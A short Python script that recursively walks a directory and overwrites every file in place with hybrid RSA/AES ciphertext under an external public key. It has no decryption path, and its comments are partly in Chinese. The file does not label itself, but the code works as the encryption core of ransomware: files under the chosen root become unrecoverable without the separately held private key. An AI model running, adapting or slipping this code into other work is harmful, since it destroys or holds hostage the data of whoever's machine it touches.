#coding=utf-8
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import sys
def Encrypt(filename):         
    data = ''
    with open(filename, 'rb') as f:
        data = f.read()
    with open(filename, 'wb') as out_file:
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(open('my_public_rsa_key.pem').read())
        session_key = get_random_bytes(16)
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)

def Work_Encrypt(rootDir): 
    list_dirs = os.walk(rootDir) 
    # flag = 0;
    for root, dirs, files in list_dirs: 
        # flag = 1;
        # if(files == []):
        #     print("No Files In The Current Directory")
        # 切换加密和解密过程
        if True:
            # 遍历文件，加密
            for f in files: 
                filename = os.path.join(root, f)
                # print("Encrypt the file: " + filename)
                Encrypt(filename)
    #     else:
    #         print("Wrong parameters")
    #         return
    # if(flag == 0):
    #     print("Current Directory Does Not Exist")

    # if(len(sys.argv) > 2): 
    #     d = sys.argv[2]
    #     Flag = sys.argv[1]
    #     if(Flag == 'encrypt'):
    #         Main(d, Flag)
    #     else: print("Wrong parameters")
    # elif(len(sys.argv) == 2):
    #     print("Miss address or command:'encrypt'")
    # else: print("Miss address and command:'encrypt'")